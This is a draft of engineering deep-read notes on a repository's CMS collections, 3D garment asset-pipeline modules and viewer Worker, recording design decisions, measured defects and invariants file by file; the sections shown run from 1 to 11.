# Deep-read notes (Track A1)

Read-and-annotate record for the master plan's A1 backlog: one section per
file — what it does, the invariants it holds, warnings found, and whether the
measurements its comments cite hold up.

Sections 1–15 are the deep reads of the priority files (Products, RawUploads,
publicViewer, the five pipeline engines, the four Stage collaborators, the
bundle gate, and all eight GitHub workflows). Sections 16–18 are the
full-surface sweeps: the remaining CMS surface, the remaining asset-pipeline
surface, and the shared contract package.

Written 2026-09-22. Evidence-only: every claim below was read in the file it
describes; nothing here is inferred from outside the repository. Warnings use
this repository's own vocabulary — a measurement in a comment is treated as a
claim to check, not a fact to repeat.

---
# A1 deep-read notes (staging — will become docs/DEEP-READ-NOTES.md)

## 1. apps/cms/src/collections/Products.ts (808 lines) — READ 2026-09-22
Key findings: (to be summarised on final write)

- `readArtworkVerdict` FAILS OPEN by design (line 22-30): a transient D1 read failure must not block publishing; only a KNOWN-damaged verdict blocks.
- `DEFAULT_RETIRED_MESSAGE` (line 19-20) — American spelling per owner decision.
- publishGating import set: `becameUnverifiedWhilePublished`, `GATED_FIELDS`, `assertPublishable`, `changesAnything`, `deriveVariantsVerified`, `toGateColourways`.
- validateCatalogueUrl from lib/privateDocumentLinks.
- Camera fields + colourways field + deriveSlug are shared modules.
- mediaRules supplies IMAGE_MIME_TYPES / MODEL_MIME_TYPES.

## 2. apps/cms/src/collections/RawUploads.ts (461 lines) — READ 2026-09-22
- PRIVATE ingest inbox; admin/editor-only, bucket has no public domain — raw can never be buyer-facing; only shrunk output re-enters Media (40 MB guardrail there).
- ⚠️ `admin.hidden: true` for everyone TRIED 2026-08-09 + REVERTED: `admin.hidden` gates admin ROUTES, not just nav (measured payload 3.86.0). RUNBOOK "Re-processing a garment" links directly to the collection route — hiding would remove the documented recovery path. Now hidden only for non-admin.
- ⚠️ DO NOT ADD `mimeTypes` (lines 75-95): breaks every >50 MB upload — storage-r2 getFile returns empty body >50 MB w/ clientUploads → payload guesses text/plain → rejection AFTER transfer. Real gate = checkRawUpload(). Upstream bugs cited (payload#7408, #12620, #8673, #12905). `allowRestrictedFileTypes` also removed (never load-bearing).
- beforeChange verify-bytes-in-R2 guard: Payload treats staticHandler 404 as success → phantom record (2026-07-27 incident, 382 MB). MUST be APIError w/ explicit status — plain Error → Payload's "Something went wrong" (happened on first live test).
- afterChange enqueue: retry decision machine in rawUploadRetry.ts; Q-07: retry-while-running refuses duplicate + un-ticks hidden box server-side; CI-01: ingest bucket 14-day expiry — retry on expired file marks failed w/ EXPIRED_UPLOAD_REPORT instead of dead-lettering.
- `autoDetailFor` only UPGRADES (stored default balanced indistinguishable from untouched) — packages/shared/src/shrink.ts.
- Enqueue-failure catch: marks row failed w/ plain-language report, deliberately NOT rethrown (document + 350 MB upload valid); double-failure (update also fails) → CRITICAL log.
- targetProduct REQUIRED because single-glb-variants product without it can never publish (publishGating.ts:130 deriveVariantsVerified) — error would otherwise talk about Colours tab, nowhere near cause.
- detail description distinguishes SMEARED/TORN (mesh, Detail fixes) vs SEE-THROUGH/pale box (alphaMode, Detail never helps — 2026-08-04 owner loop from mis-calibrated CUTOUT_MID_FRACTION).
- `variant_mapping` column kept in DB (drop = table rebuild = most hazardous D1 op); same decision as `presentation_mode` on Products.

## 3. apps/cms/src/endpoints/publicViewer.ts (205 lines) — READ 2026-09-22
- The single read-only door CMS→viewer; projection lives in `./projectViewer` (pure + unit-tested); never drafts/users/internal notes.
- Colourless route `/api/public/viewer/:productSlug` exists because a trimmed URL/product-code tag produced "reference unavailable" for a working product; deliberately does NOT set `requestedColourwayUnavailable`.
- ⚠️ `expectColour` flag separates "named a colour and it was mangled" (→404) from "named no colour" (→default). Deriving from empty `params.colourSlug` would collapse them and silently serve default for a broken link.
- ⚠️ `PUBLIC_CACHE_CONTROL` hardcoded (L2, 2026-08-18): old 3-layer cascade (settings field → env → 60) had NO observable effect — Worker responses don't pass edge cache (perfProbe; no `cf-cache-status` live). Knob removed, directives unchanged (correct for a future shared cache).
- ⚠️ `Vary: Origin, Sec-CH-Prefers-Color-Scheme` (L1): ACAO varies by Origin (allowlist verified live) → a cache keyed without Origin could serve no-ACAO variant to viewer = intermittent "REFERENCE UNAVAILABLE" inside 60s/300s window. Inert today. ⚠️ Setting it here was NOT ENOUGH: `withPayload` appends `/:path*` Vary rule AFTER app headers() and Next lets last matching rule win — production answered without Origin while the test was green (merge L1 → 2026-08-18). Real fix: `apps/cms/publicViewerHeaders.mjs` rule pinned by `src/publicViewerHeaders.test.ts` w/ negative control. Keep this constant in step with `PUBLIC_VIEWER_VARY` there.
- 404s also carry Vary + Cache-Control s-maxage=30 (cheap responses are what a cache would keep).
- ⚠️ Latency: measured 2026-09-06 — this endpoint 1,178–1,291 ms vs viewer HTML 41–49 ms and model 37–42 ms (25× slower, not cold start; ~900 ms = two D1 reads + projection; `/api/health` same host 265–338 ms). Cache-before-DB: `viewerCache` caches the BODY not the Response (see viewerCache.ts); honest limit: cold isolate first scan unaffected. **This is E1's time-to-first-render driver on a cold isolate.**
- Second D1 query (old top-level `colourways` collection) removed — colours now inline array at depth 1 (2026-09).
- ⚠️ ONE global now, not two: `build-process` global retired 2026-09-05 — a shared copy that silently overrode eleven garments' bespoke text; dropping it also removed a D1 round trip from hottest endpoint.
- Only successful projections cached (404/wobble stays bad request, not bad minute) — same rule as src/lib/content.ts.

## 4. tools/asset-pipeline/src/simplify-textured.ts (516 lines) — READ 2026-09-22
- WHY: glTF-Transform `simplify()` sees vertex positions only; smearing UVs under CLO printed graphics tears artwork (first real export). Old fix `lockBorder:true` worked for wrong reason at brutal price — froze EVERY topological border (neckline/cuff/hem/UV island): real 373 MB export went 850k → 6.0 M / 58.3 MB = 45% OVER 40 MB ceiling → nothing publishable.
- Right tool: meshoptimizer `simplifyWithAttributes` w/ UV error in budget → LockBorder dropped entirely; fallback to library `simplifyPrimitive` + lockBorder as floor (no UVs, quantized attrs, non-triangles).
- Calibration: uvWeight × error trade directly; effect ONLY exists where UV map non-linear (linear unwrap survives any decimation; real garment unwraps aren't linear).
- `AttributeSimplifier` interface narrows index buffer to `Uint32Array<ArrayBuffer>` — upstream says `Uint32Array` which TS ≥5.7 reads as `ArrayBufferLike` (SharedArrayBuffer possible) → refuses `Accessor.setArray`. meshoptimizer never returns shared buffer; narrowing avoids copying multi-MB index buffer.
- `skipMeshes` (RegExp): so `--stitch` and `--simplify` never both decimate thread. Measured 2026-08-21: stitch pass 777k → simplify pass 445k → cord frayed into spikes, rejected on sight. optimize.ts sets it to topstitch pattern when stitch ran. Counted as `ownedElsewhere`, NOT `skipped` (different meaning).
- `decimateArtwork` default FALSE since 2026-09-02: artwork-carrying primitives untouched. Measured: ARISAN BRA 0.42 MB of 40 MB budget vs torn brush panels + chewed waistband slogan (F1-02, FAB-08); X-Milo white shards in back wordmark (B-02); Training Trouser chevrons "attacked with a wire brush" while every gate passed (A-01). meshoptimizer vertex_lock considered+REJECTED (locking print verts still lets neighbouring cloth triangles pull boundary UVs). Structural rule: artwork never decimated → damage cannot happen; cost few hundred KB.
- `onResult` counters surfaced: used to go only to doc logger at debug = nowhere; if most primitives take fallback, UV-aware decimation never happened and every hour tuning `--uv-weight` was on a disconnected knob.
- `listUvSets`: ALL TEXCOORD_n weighted (was TEXCOORD_0 only) — CLO "Apply Graphic" puts prints on 2nd UV set → material w/ baseColorTexture.texCoord 1 had UVs decimated at ZERO weight while fabric protected = silent selective non-protection (first-garment damage). prune() ran earlier so present sets are in use. ONE non-Float32 set → whole primitive to conservative path (dequantize helper not exported).
- trySimplifyTexturedPrimitive: strips/fans → triangles; uvWeight≤0 → hand back to fallback; compactPrimitive when index addresses <half vertices; builds interleaved attribute buffer [u0,v0,(u1,v1),…(nx,ny,nz)], weights = uvWeight per component (every UV set priced the same), normalWeight for normals; NO LockBorder (UV error in budget is the protection; locking borders would re-inflate count); dstIndexCount = floor(ratio·len/3)·3; narrows to Uint16 when ≤65534 vertices; disposes src accessor when last parent.
- `runSimplifyTextured` (sync, exported so tests avoid WASM transform pipeline): weld first (simplifier can't collapse split vertices). Artwork-by-UV-span computed ONCE via findArtworkTexturesByGeometry (language-independent; excludes thread/hardware by name) — audit HG-03: garment whose prints are `Asset 2@2400x` has NO artwork by name → name-only skip would decimate its prints and never know.
- NEVER DECIMATE A PRINT PIECE checked on default material AND every KHR_materials_variants mapping (geometry shared → a print in any colourway protects the piece for all).
- `artworkAtRisk` RESTATEMENT: used to fire only on rare position-only fallback → silent by construction on every real garment while fast path tore lettering (HG-02, F1-09). Now asserts protection held: any protected primitive whose index count moved is named → Worker refuses the file. Structural, no false-positive case.
- `artworkMaterialNames`: two signals (material NAME in gate word list OR base-color texture artwork by UV SPAN — catches `ZZ00000ZZZZ0` and `ルン ろご。`); thread/hardware excluded by name FIRST whatever their picture; reads default + variant mappings (twice-missed trap).
- ⚠️ `materialCarriesArtwork` READS MATERIAL NAME — read TEXTURE name until 2026-08-29 → gate could NEVER fire on a real garment (CLO names materials, leaves textures anonymous: all ten raw exports, 2,398 images, zero names/URIs) = decoration. Tests never noticed because placeholders.ts names all six textures (fixture had the one property real files lack).
- ⚠️ OBVIOUS FIX IS A TRAP: glTF `textures[].name` IS populated but every value is literal "Texture", and ARTWORK_NAME contains `text` which "Texture" contains → would flip never-fires → always-fires (measured re-exported Minecut Motion: 50 of 50 textures match). `ARTWORK_MATERIAL_NAME` deliberately omits `text` and `type`. Material predicate measured: 48 of 114 materials, right ones (`Material_Graphic_*`, `RUN LOGO_*`, `LOGO Team wear Embridory gold gold_*` ×6 colourways); controls: 3 plain fabric names match 0, known artwork name matches 1, 48<114.
- Material must show a visible texture slot first (baseColor OR emissive) — name-only would flag textureless trim/hardware.

## 5. tools/asset-pipeline/src/texture-artwork.ts (694 lines) — READ 2026-09-22
- WHY it replaced `textureCompress`: libwebp lossy = 8-bit Y'CbCr **4:2:0** (chroma half-res both axes) → hard saturated edges bleed — canonical failure for wordmark/flat graphic. Evidence: 2048² base-colour at **13 KB = 0.003 bytes/pixel** (q82 4:2:0 on mostly-flat logo on transparency).
- WHY NOT options-to-textureCompress: its options expose quality/lossless/nearLossless/chromaSubsampling, but chromaSubsampling is JPEG/AVIF-only, sharp IGNORES it for WebP. Real levers = `smartSubsample` (libwebp "Sharp YUV", chroma in linear light), `alphaQuality`, `effort` — none exposed → call sharp directly.
- `smartSubsample` applied to EVERY texture (no size cost — changes how chroma computed, not stored).
- Three regexes with distinct jobs:
  - `ARTWORK_NAME` (texture names+URI): unanchored, includes `text`/`type` — OK for textures.
  - `ARTWORK_MATERIAL_NAME` (materials): drops `text`+`type`, token-boundary anchored (`^|[^a-z]…[^a-z]|$`) — `\b` unusable since `_` is word char and `Material_Graphic` must match. Added 2026-09-02 (MAT-17, CLO-04): `slogan|extra mile|never look back|ろご|ロゴ` — CLO names `THE EXTRA MILE (Slogan)` ×33 materials/7 garments; two-way control: none of 7 fabric names (`Textile_Cotton`, `Texture_Map_01`, `Polyester_Textured`, `Cotton_Canvas`, `Default Fabric`, `SUPPLIER_DOBBY_A`, `Default Topstitch`) contain these words. Caught by auditing regex against plausible names, NOT by a failing test.
  - `DATA_SLOT` = normal|metallicRoughness|occlusionTexture — data never artwork whatever called.
- `dataMaxSize`: measured 2026-08-21 Cycling-Bib: data maps 9.63 MB of 16.65 MB budget > artwork 7.03 MB (ran at colour-map resolution). Halving: 38.1 → 32.6 MB no visible change. Quartering REFUSED: 1.67% pixels moved >8/255, visibly flattened white fabric weave, for 1 MB.
- ⚠️ TWO CLASSIFIERS SINCE 2026-09-02, deliberately: GENEROUS `isArtworkTexture` (deserves higher compression budget? false positive = few hundred KB, false negative = crushed print; feeds ONLY compression + crushed warning) vs STRICT `classifyArtworkForGate` (may alpha state REFUSE garment? false positive throws finished garment away). Until 2026-09-02 one function did both → shrink robot refused **2 of 5 finished garments** (AERO-TECH WINDBREAKER, ARMOR-TECH JACKET) over `Default Topstitch_3569`/`_3296` — CLO thread strip 236×39 read as wordmark (3:1 strip) BEFORE alpha inspection; refusal told owner to re-export artwork that didn't exist (F2-01, HG-01, B-03, CG-02, CT-06); re-export could never clear it — the picture shape is CLO's.
- Strict rules in order: (1) thread/seam/tape/zipper/hardware name → never artwork (NOT_ARTWORK_NAME); (2) material/base/emissive NAMED artwork → yes (CLO names materials, textures anonymous: Cycling-Bib **0 of 24 textures** had name/URI; first double-siding attempt did nothing because of this); (3) hard alpha cut-out (binary) → yes (decal); (4) SHAPE ALONE NEVER QUALIFIES (long thin + soft alpha = thread/trim). Only OPAQUE skips decode.
- `findCrushedArtwork`: threshold check was correct BUT only inside `inventoryTextures` (manual `textures` command) — automated path calls `inspectGlb` which never looked → cheapest measurement of reported damage existed, correct, connected to NOTHING (N001 live file 2048² at 0.003 bpp, 6.6× past line). Since 2026-09-02 judged over **INK** not whole picture (F2-07): whole-picture bp cried wolf on 3 of 4 finished garments (logo strip mostly transparent padding — AERO 1095×720 = 0.0121, 4096×1263 = 0.0181 while 6° crops matched raw to 0.6% of pixels); over ink = 0.024/0.074 vs genuinely-crushed N001 0.009; 0.02 line separates both ways. Cheap-test-first: whole-picture bpp is upper bound → header-only pre-filter, decode only for failures (0.21 ms/call vs inspectGlb 0.90 ms). Flat one-colour print stores tiny+crisp → `isFlatInk` exemption. WARNING only (a gate owner learns to override is worse than none); blocking signal = `artworkAtRisk` (structural).
- `auditArtworkAlpha`: `<model-viewer>` has no order-independent transparency → BLEND renders see-through + depth-sorts badly ("half visible, half not"). Since 2026-09-02 a BLEND artwork material is a `blend` PROBLEM only when `resolveBlendAlpha` (the very function solidify applies) says it should have changed = real regression; when it says `keep` → reported in `soft` (graded/sheer-factor/undecodable), never refused. MASK cutoff ≠0.5 → refusal unchanged. Scoped to artwork (sheer mesh is *supposed* to blend; `translucentMaterialCount` reports that). Audit finding 5: old gate could only fire on the decision it policed or misclassified thread.
- ⚠️ uv-span signal rescues **8 of 28 garments** with ZERO word-list material matches (artwork called `ZZ00000ZZZZ0`, `76197`, `01`, `Untitled-1`, `ルン ろご。`) — computed once, no decode, no names; must NEVER reach `findArtworkAlphaProblems` (blocking gate).
- isDataTexture requires EVERY slot data → a map also used as baseColor keeps full colour cap (never silently downsampled under shared artwork).
- Alpha boost AFTER resize BEFORE encode: downsampling lowers peak alpha of thin stroke → coverage measured on pixels that actually ship (measuring original then rescaling resized preserves the wrong number). Boost only for artwork ∩ MASK-resolved cutoutTextures (`alphaBoostForCoverage(…, 0.5)`).
- ⚠️ MUST DECLARE EXT_texture_webp or every output is INVALID glTF — writing `image/webp` insufficient; spec requires extension in `extensionsUsed`. Found 2026-08-27 first time Khronos validator ran on own output: every processed garment failed for as long as WebP pass existed (p001 44 errors, arisan 38, n001 42, geovent 45 — IMAGE_NON_ENABLED_MIME_TYPE + TEXTURE_INVALID_IMAGE_MIME_TYPE in pairs). Nothing caught it: `<model-viewer>` sniffs bytes and renders anyway; stricter runtime (Quick Look AR) entitled to refuse while every repo gate green. NOT setRequired (readers without WebP should load geometry).
- decode failure → texture left EXACTLY as was, not dropped (missing logo worse than unoptimised one).
- Result counters: artworkResized = real stroke-detail loss on wordmark → reported NOT blocked (trade owner should see, not discover); standardResized/dataResized recorded since 2026-09-03 (Rank 13, HE-05) so artwork eval can prove `--max-texture`/`--data-max-texture` ACTED not merely passed; routine so not in owner report.

## 6. tools/asset-pipeline/src/pbr-normalize.ts (126 lines) — READ 2026-09-22
- glTF absent `metallicFactor` defaults to **1.0**; CLO omits it on some fabric → format says "fully metal". A/B on MATRIX-PUFF JACKET: metallic 0.29 = glossy black patent leather; 0 = matte fabric w/ quilting visible; 5 materials = **76.6% of triangles** (whole body, not trim). METRO-SHIELD `Nylon_Canvas Copy 1_*`: absent metalness at roughness **0.10** = mirror.
- **55 offenders, NOT hundreds** — MR-texture check is the difference: 515 materials metallic w/o metallicRoughnessTexture, 440 = legitimate hardware → 55. Another **3,593** are metallic-by-omission but carry MR texture (blue channel = per-pixel metalness) — correct: X-MILO 6835x5331 MR map mean metalness 0.000, 100% non-metal, roughness 0.905. Counting them produced the false "hundreds" figure.
- Why no test could fail before: only `setMetallicFactor` calls in repo = four in `placeholders.ts`, all seeding 0 → correct, incapable of exhibiting the defect (repo's recurring fixture-shape pattern).
- Uses `classifyMaterialName` from material-class.ts (B1 Task 0 artifact).

## 7. tools/asset-pipeline/src/overlay-depth.ts (539 lines) — READ 2026-09-22
- THE DEFECT (open from first msg 2026-08-27 → end of 08-28): small white specks that appear/vanish as garment turns — owner: "sparkling", "bits of the garment are missing". CLO stacks TWO OPAQUE surfaces at almost same depth (print layer over plain fabric); they fight the depth test, winner changes per pixel/frame, pale layer punches through. NOT in any texture (every base-colour measured, no light flecks on dark field). Hiding Minecut Motion's `Material_Graphic` turns skirt 100% white → exposes layer behind.
- ⚠️ NOT material-name matching: `Material_Graphic` was only the garment inspected; repo already shipped a name-based artwork check silently inert — **0 of 5,048 textures** carry a name (material-class.ts), real artwork materials = `ZZ00000ZZZZ0`, `01`, `Untitled-1`, `ルン ろご。`. A name is a hint; geometry is a measurement.
- ⚠️ NOT bias-every-opaque: that's the failure decal-depth-bias.ts guards — pushing garment BODY forward pushes it through what's behind it. Measured on p001 (worst on crude screen): body panel `Fleece_Terry_FCL1PSK002_4036` frontness 0.34 → correctly REJECTED.
- (Full read; frontness metric is geometric: printed layer sitting a hair in FRONT of cloth.)

## 8. tools/asset-pipeline/src/strategy.ts (150 lines) — READ 2026-09-22
- `shrinkFlagsFor`'s "geometry not texture" justification was true of ONE garment; measured 2026-08-26 across all 28 raw exports it is false for 15 — X-MILO CORE OVERSIZE 1,022.7 MB textures vs 55.3 MB geometry, run still spent budget as if geometry were the cost then compressed textures to fit.
- ⚠️ Design doc got it WRONG: proposed dropping `--simplify` for texture family ("nothing to gain") — measured both ways: costs **+0.0%** on `women athlatic dress` (byte-identical, 9,980 triangles) but **+13%** on X-MILO (80.2 vs 71.0 MB, still 1.77 M triangles, 95% textures by size). Triangle count decides geometry; texture fraction decides textures → geometry flags unchanged for everybody; only TEXTURE budget moves.
- ⚠️ Artwork is NOT the cost: X-MILO artwork textures BYTE-IDENTICAL between settings (3169x476 @ 29.3 KB each, as is every small texture); only 4096x3195 fabric atlases downsampled. Earlier macro-crop reading concluded lettering damaged — it was NOT; letterforms appeared in diff only because the CLOTH around each stroke changed and outlined them.
- WHERE: Worker calls `shrinkFlagsFor` before download (R2 key only); `packages/shared` lint-forbidden `node:*`. Container imports by relative path.
- ⚠️ EVERYTHING ADDED IS A LITERAL — `container/server.ts`: what kept the flag path safe was upstream hardcode, NOT the filter that looked like the work. Must never interpolate caller values where `parseOptimizeArgs` could read them as input path.
- `TEXTURE_FAMILY_FLAGS` hardcoded (calibration sweep in GARMENT-CATALOGUE-BASELINE.md, not arg/tuning — tuning against file size is how "Smallest file" shipped): max-texture 2048, data-max-texture 1024, quality 70, artwork-quality 95. Measured X-MILO 71.0 → 24.8 MB, artwork untouched; cost = fabric weave 0.03% pixels at normal viewing, visible only at 5° macro.
- `refineFlagsForFamily`: geometry/mixed returned BYTE-IDENTICAL (12 garments + Mantra Ray must not move — identical by construction > verified after). Drops flag AND its value together (stranded bare token = parseOptimizeArgs input-path bug), then appends family flags (TEXTURE_FAMILY_KEYS replace-not-duplicate for re-runs).
- `SMALL_EXPORT_MAX_TRIANGLES = 500_000`: below it, drop general decimation (`--simplify`, `--simplify-error`, `--uv-weight` + values) — topstitch/codec/textures still apply. WHY: written for millions-of-triangles exports (N001 10.6 M, Cycling-Bib 34.0 M); owner's finished garments 2 orders smaller where decimator buys ~nothing and costs the print: ARISAN BRA 97,850 tri saved 0.42 MB of 40 MB budget + tore brush-panel holes (F1-02); Training Trouser 366,084 shredded chevrons while every gate passed (A-01); Minecut decimated print triangles behind cloth = white holes (A-04). Measured 2026-09-02 robot-flags: 500k keeps all finished garments + two small old exports whole; still decimates X-Milo + big exports (where `decimateArtwork: false` protects prints anyway); 500k tri ≈ 6–8 MB meshopt — far from ceiling, size gate stands behind.
- `refineFlagsForSize`: `triangles === null` (readout failure) → unchanged — failure must never silently alter compression. `refineFlags`: description.error → 'mixed' family + null triangles = both refinements no-op (failure direction cannot silently change a garment).

## 9. packages/shared/src/shrink.ts (288 lines) — READ 2026-09-22
- The contract CMS inbox ↔ shrink service; was two hand-copied interfaces w/ "Must match" comments → one type so a change is a compile error, not a queue message silently losing a field.
- Detail levels expose re-run without container rebuild (pipeline source baked into image — pre-field: Docker + wrangler deploy + minutes).
- `'small'` REMOVED 2026-08-05 after measurement: six-run sweep of raw N001 rendered chest wordmark — `small` (simplify-error 0.002) visibly breaks "MILE", 0.005 destroys it, yet **all three blocking gates passed** (they test alphaMode, decimation never changes it) → shipped damage to the one thing the product exists to show with nothing able to say so. An option whose honest instruction is "pick this then check by eye whether it wrecked your logo" is a trap → removed not re-tuned. Re-tuning buys little: `balanced` moved onto measured frontier same day (0.001, loosest budget checked logo-by-logo); 0.002 is the very next sweep run where MILE breaks; any safe value below balanced lands in that gap, and two options a MB apart are not two options. ⚠️ Reasoning contingent on where balanced sits — first written vs balanced 0.0005 where it was simply false (0.001 safe AND 10.7 MB smaller); if balanced tightened again, re-measure before repeating the claim. Old `'small'` rows still parse → fall through to balanced (strictly safer).
- `autoDetailFor` only ever UPGRADES (stored default balanced indistinguishable from untouched — refusing to honour explicit Balanced would refuse everyone who left default); `rawBytes` 0/undefined = size unknown → too big to upgrade (fail safe). AUTO_FIDELITY_MAX_RAW_BYTES = 50 MB: MEASURED — AERO 16.19 → 3.39 MB fidelity (8.5% of ceiling), Minecut 45.59 → 5.76 (14.4%); old-settings exports 90 MB–1.25 GB land 67–83% even on lower setting. ⚠️ Raw size is a PROXY for topstitch (new exports 0% topstitch, old ~92%); if catalogue ever holds a small-but-geometry-heavy export, re-measure — do not raise on reasoning alone.
- Flags: ⛔ `--meshopt` NOT `--draco` — DRACO DOESN'T LOAD ON LIVE VIEWER (twice in production 2026-08-21: draco X-MILO PRO BIB renders nothing → poster; console shows model-viewer fetching decoder from www.gstatic.com = CSP-blocked; fresh page `dracoDecoderLocation` reads **gstatic default** while `meshoptDecoderLocation` correctly reads `/meshopt_decoder.js`). ⚠️ Cause NOT the obvious one, still open: Stage.tsx sets all four values on the CLASS (local misleadingly named `element`), bundle provably contains the assignments, none throw replayed, `/draco/*` 200, setter works by hand — code right, shipped, not in effect. **Do NOT "fix" by re-ordering lines; verify live `dracoDecoderLocation` = `/draco/` on cold load first.** Measured draco win real (20.6 vs 31.0 MB, faster 908 vs 1168 ms @4x) — reclaim once viewer fixed; shipped X-MILO PRO BIB is meshopt build 33.1 MB. Historic: paper assumption inverted — meshopt 31.0 MB/1168 ms vs draco 20.6/908 @4x; @6x 1672 vs 1259; extra ~10 MB costs more to fetch+upload than faster decode saves; viewer already self-hosts Draco decoder + CSP allows wasm-unsafe-eval (needs no viewer change).
- `--max-texture 4096`: all-over halftone 4952x7014 is BLEND → `isArtworkTexture` classifies as sheer FABRIC → took 2048 cap, squashed to 29%, round dots → blocky squares. Raising general cap = safe lever; widening artwork classifier is not — it also feeds `findArtworkAlphaProblems` which THROWS and saves nothing. `--data-max-texture 2048`: data maps 9.63 vs artwork 7.03 MB from colour-map resolution; halving invisible, quartering refused (flattens weave for 1 MB). `--quality 75` (from 82): 0.00% pixels differ >8/255; artwork untouched (own --artwork-quality 95). Net on that export: **1,253 MB → 20.6 MB** w/ logos, slogan, halftone, thread cord, all five colourways verified vs uncompressed original.
- `--stitch 0.03` / `--stitch-error 0.0005`: Cycling-Bib 1.31 GB export = **99.97% of 33,964,432 triangles was `Topstitch_*`**, 0.03% garment (`Cloth_mesh` 11,128 tri carrying all 116 artwork materials) — one budget can't serve both (why `--simplify` alone bottomed at 57.4 MB). 0.0005 TIGHT on purpose = the real dial; self-limits (asked to keep 3% kept 3.99% and stopped rather than damage cord); 20× looser 0.01 + second pass = frayed spikes rejected on sight. Safe alongside `--simplify`: optimize.ts passes skipMeshes when stitch ran (thread never cut twice). ⚠️ Judge changes on **4–7° macro crop of a seam** — at default 18° crop-chest a ruined cord is indistinguishable from intact; that's how frayed version was first reported "identical".
- `nextDetailAdvice`: no smaller level to send owner to — old one reached that size by damaging printed artwork = the product; honest lever is the export (re-export from CLO at lower mesh density). Saying so plainly beats a suggestion trading visible failure for invisible one.

## 10. apps/viewer/worker/index.ts (442 lines) — READ 2026-09-22
- Job: per-request OG card naming the actual garment+colourway (SPA fallback can't vary per request; crawler runs no JS so App.tsx title never reaches it).
- ⚠️ Guarded `/render` until 2026-08-17 (refused non-own `model=` host); route + guard removed with poster capture (owner decision). Removing a route removes attack surface — but also the ONLY response this Worker built itself. `securityHeaders.ts` deliberately kept — read its header before adding next `new Response`: `_headers` does NOT reach one.
- Checked before adding Worker (wrangler 4.114.0, 2026-08-08): `_headers` CSP/HSTS/Permissions-Policy applied by asset router; measured assets-only, `env.ASSETS.fetch`, and `new Response(body, response)` ALL returned identical CSP/HSTS + deliberately non-default probe, X-Worker-Ran control proving Worker in path.
- ⚠️ ASSET REQUESTS NEVER REACH THIS FILE (measured, not docs): `run_worker_first` unset → anything matching a file in dist/ served directly; logged every entry: `/assets/index-*.js`, `/og/n001/wine.jpg`, `/` produced NO log line, `/n001/lime` one. /assets/* keeps zero-overhead path; only SPA-fallback routes cost anything.
- ⚠️ LOAD-BEARING: **ONLY CRAWLERS GET THE REWRITE.** Measured 2026-08-08 five requests each: static HTML 0.106–0.155 s, cms /api/health 0.428–0.657 s, cms /api/public/viewer/n001/wine **1.77–2.27 s** (Payload + D1 + lexical→HTML), NOT edge-cached on either host (cf-cache-status empty; Worker's own response doesn't pass edge cache, so its `s-maxage=60` buys nothing). Putting it before HTML = QR scan ~0.11 s → ~2 s TTFB = **20× regression for every visitor** to fix what no visitor sees. Crawler fetches precisely because it wants the head, allows ~10 s (FB, WhatsApp) → it waits, visitor doesn't. Conservative list OK: miss falls through to index.html generic card = exactly what every link showed before; failure of a miss is "no worse than yesterday", never a broken page.
- CRAWLER regex: bot|crawler|spider + the ones that don't self-identify: facebookexternalhit, facebookcatalog, whatsapp, skypeuripreview, vkshare, iframely, embedly, cardyb (Bluesky), mastodon, slack-imgproxy, google-inspectiontool, link preview, linkpreview. PREVIEW_CACHE_SECONDS 60 (matches CMS s-maxage); CMS_TIMEOUT_MS 8000 (beyond = crawler has given up → generic card).
- `loadPayload`: null on ANY failure (timeout/404/malformed/missing binding) → caller serves asset response untouched = CMS outage degrades link preview to generic, NEVER a broken page — deliberately blunt: feature cosmetic, nothing worth failing page load over. Colour segment dropped not sent empty (`/n001/` and `/n001/null` read as mangled colour → 404; same rule as src/lib/api.ts). Cache key `${origin}/__og${path}` — viewer's OWN origin so entry unambiguously in zone; cannot leak (every request to host reaches Worker before cache consulted; visitor asking for this path gets three path segments → parseViewerPath rejects; body is public API response anyway).
- ⚠️ Every failure returned null SILENTLY until 2026-08-30: correct degradation but indistinguishable from "crawler never matched" → link previews could stop working for every garment with nothing saying so. Now one line each naming path+reason (cms-status/cms-error/incomplete-payload/fetch-threw) without logging payload — enough to tell CMS outage from renamed slug from malformed payload. Cache WRITE failure deliberately silent (one extra fetch, runs in waitUntil where nobody reads outcome).
- `applyPreview`: og:url + canonical APPENDED not overwritten — index.html deliberately carries neither (static value tells crawlers /n001/wine is homepage → invites collapsing every colourway into one page); per-request is the only form in which they're correct; scripts/og.test.ts asserts they stay absent from static file. schema.org Product JSON-LD appended (crawler with no JS learns what page IS, not just how link looks; no `offers`, see buildProductJsonLd). og:image missing → tags REMOVED not left: leaving would show N001 in wine for whatever garment this is = a false card; this feature exists to put links in front of leads.
- `/og/*` missing preview MUST be 404 not a page: `not_found_handling: single-page-application` right for HTML routes, actively wrong for /og/* — measured 2026-08-31 `GET /og/zzz-nope/zzz-nope.jpg` → **200 text/html 8,017 bytes** byte-identical to bogus page URL; social platform handed a document with success code = nothing to fall back to, no reason to retry. Check on RESPONSE not known-files list (real card `image/jpeg`, SPA fallback `text/html` — stays correct as garments added). BEFORE crawler branch (crawler is exactly who asks). Audit 2026-08-30 PM, L5-05. Uses `workerResponseHeaders()` NOT hand-written content-type: `_headers` applied by STATIC ASSET handler — `env.ASSETS.fetch()` carries it, `new Response(...)` never enters that path, carries NOTHING — measured live edge 2026-08-12: old `/render` refusal shipped w/ all five security headers ABSENT while 200 beside had them all. First Worker-built response since = exactly what securityHeaders.ts was kept for.
- Soft-404 fix (`shouldReturnNotFound`, 2026-09-04): every unknown URL answered "200 OK" = soft 404 to crawler; body must stay branded page so human who scanned a worn tag still gets Email+WhatsApp rather than browser error. ⚠️ Headers copied EXPLICITLY (not incidental): asset fetch carries all five, `new Response(...)` carries none (measured live edge 2026-08-12); passing `asset.headers` through keeps this a status change not a silent security-header regression.
- Non-crawler branch: majority of requests pay one URL parse + one regex, byte-for-byte pre-Worker. Crawler branch: `Vary: User-Agent` (response depends on UA; stops cache handing crawler's copy to visitor), + no-transform re-applied to rewritten copy (crawler executes no JS → Cloudflare's injected bootstrap pure weight; one rule to reason about instead of two).

## 11. apps/viewer/src/lib/camera-near-plane.ts (196 lines) — READ 2026-09-22
- DEFECT (owner, 2026-08-29, own M4 Pro): white specks blinking over printed graphic as garment turns — ONLY zoomed out; zoomed in flawless. That asymmetry is the whole diagnosis.
